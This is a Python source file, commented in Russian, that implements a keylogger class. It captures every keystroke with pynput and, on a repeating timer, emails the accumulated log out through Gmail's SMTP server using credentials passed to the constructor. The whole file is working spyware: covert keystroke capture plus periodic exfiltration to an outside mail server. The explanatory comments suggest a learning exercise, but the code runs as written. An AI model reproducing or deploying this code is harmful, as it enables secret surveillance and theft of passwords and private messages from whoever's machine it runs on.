import pynput.keyboard
import threading
import smtplib

# создадим пустую переменную 
log = ""
# self укзывает с работай методов
class Keylogger:
    # создадим конструктор который сам будет запускать во время вызова и после вызова класса просто подставляем свои значения аргументам
    def __init__(self, time_interval, email, password):
        self.log = "start keylog"
        self.interval = time_interval
        self.email = email
        self.password = password
        
        
    # метод для добавления в log
    def add_log(self, string):
        self.log = self.log + string
    
    # фун для вывода нажатой кнопки 
    def key_but(self, key):
        # global log 
        # для вывода если нажали на кнопку без символа
        try:
            # log = log + str(key.char) #для того чтобы симовлы только отображались без буквы u
            cur_key = str(key.char)
        # для работы с ошибкой 
        except AttributeError:
            # если пробел
            if key == key.space:
                # log = log + " "
                cur_key = " "
            # если обычный кнопки
            else:
                # log = log + " " + str(key) + " "
                cur_key = " " + str(key) + " "
        print(key)
        # добавим вместо повторения кода
        self.add_log(cur_key)

    # фун для вывода на почту
    def report(self):
        # global log
        # print(log)
        self.send_mail(self.email, self.password, "\n\n" + self.log)
        self.log = ""
        # создание таймера который будет отдельным патоком работать через опредленное время
        timer = threading.Timer(self.interval, self.report)
        timer.start()
      
    #фун для создания отправки сообщения полученных данных ниже
    def send_mail(self, email, password, message): 
        #создали соеденение через гугл для отправки туда сообщения
        server = smtplib.SMTP("smtp.gmail.com", 587) #домен и порт
        # tls соеденение
        server.starttls()
        # авторизация
        server.login(email, password)
        # сообщение
        server.sendmail(email, email, message)
        server.quit()

  
    def start(self):
        # пременная которая слушает нажатые кнопки
        key_listen = pynput.keyboard.Listener(on_press=self.key_but)# передаем фун для слушателя
        # для запуска работы с неконтролируемыми данным, файл, слушатель кнопки на клаве итд
        with key_listen: 
            # отправка отчета
            self.report()
            # слушатель клавы
            key_listen.join()